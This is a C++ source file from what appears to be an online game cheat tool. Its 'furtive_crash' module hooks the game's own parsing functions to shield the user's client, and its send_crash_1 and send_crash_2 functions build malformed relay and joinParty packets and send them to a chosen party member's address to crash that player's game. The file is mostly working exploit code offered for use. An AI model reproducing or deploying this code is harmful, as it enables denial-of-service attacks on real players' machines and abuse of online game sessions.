//=====================================================================================

#include "../../StdAfx.hpp"

//=====================================================================================

namespace furtive_crash
{
	FurtiveHook fhAtoiCall{ x86Instruction::CALL, (LPVOID)t6::offsets::atoi_CL_HandleRelayPacketCall, &atoi_CL_HandleRelayPacket };
	FurtiveHook fhReadByteCall{ x86Instruction::CALL, (LPVOID)t6::offsets::MSG_ReadByte_PartyHost_HandleJoinPartyRequestCall, &MSG_ReadByte_PartyHost_HandleJoinPartyRequest };

	int atoi_CL_HandleRelayPacket(const char* str)
	{
		return min(std::atoi(str), 17ul);
	}
	/*
	//=====================================================================================
	*/
	int MSG_ReadByte_PartyHost_HandleJoinPartyRequest(msg_t* msg)
	{
		return 0;
	}
	/*
	//=====================================================================================
	*/
	void init()
	{
		fhAtoiCall.SetHook();
		fhReadByteCall.SetHook();
	}
	/*
	//=====================================================================================
	*/
	void free()
	{
		fhAtoiCall.UnHook();
		fhReadByteCall.UnHook();
	}
	/*
	//=====================================================================================
	*/
    void send_crash_1(std::size_t client_num)
	{
		Sleep(500);

		char buf[1260];
		msg_t msg;

		t6::MSG_Init(&msg, buf, sizeof buf);
		t6::MSG_WriteString(&msg, ProtoGenesys::VariadicText("relay %i", 1234567890).c_str());
		t6::NET_OutOfBandData(t6::Com_ControllerIndex_GetNetworkID(ControllerIndex_t::CONTROLLER_INDEX_0), t6::get_party_data()->get_party_member(client_num)->platformAddr.netAddr, msg.data, msg.cursize);
	}
	/*
	//=====================================================================================
	*/
	void send_crash_2(std::size_t client_num)
	{
		Sleep(500);

		char buf[1024];
		msg_t msg;

		t6::MSG_Init(&msg, buf, sizeof buf);
		t6::MSG_WriteString(&msg, ProtoGenesys::VariadicText("%ijoinParty", t6::get_party_data()->party_id()).c_str());
		t6::MSG_WriteLong(&msg, 0);
		t6::MSG_WriteLong(&msg, 0);
		t6::MSG_WriteLong(&msg, 0);
		t6::MSG_WriteInt64(&msg, 0);
		t6::MSG_WriteByte(&msg, 0);
		t6::MSG_WriteShort(&msg, 0);
		t6::MSG_WriteLong(&msg, 0);
		t6::MSG_WriteByte(&msg, 1234567890);
		t6::NET_OutOfBandData(t6::Com_ControllerIndex_GetNetworkID(ControllerIndex_t::CONTROLLER_INDEX_0), t6::get_party_data()->get_party_member(client_num)->platformAddr.netAddr, msg.data, msg.cursize);
	}
	/*
	//=====================================================================================
	*/
	bool send_connectivity_test(std::size_t client_num)
	{
		PartyData_s* party = t6::get_party_data();

		if (const auto our_client_num = t6::Party_FindMemberByXUID(party, t6::Live_GetXuid(ControllerIndex_t::CONTROLLER_INDEX_0)); our_client_num >= 0)
		{
			char buf[1260];
			msg_t msg;

			t6::MSG_Init(&msg, buf, sizeof buf);
			t6::MSG_WriteString(&msg, "vt");
			t6::MSG_WriteByte(&msg, our_client_num);
			t6::CL_SendPeerData(party->get_session_data(), 0, t6::Com_ControllerIndex_GetNetworkID(ControllerIndex_t::CONTROLLER_INDEX_0), client_num, &msg, 1);

			return t6::CL_CanWeConnectToClient(party->get_session_data(), our_client_num, client_num);
		}

		return false;
	}
}

//=====================================================================================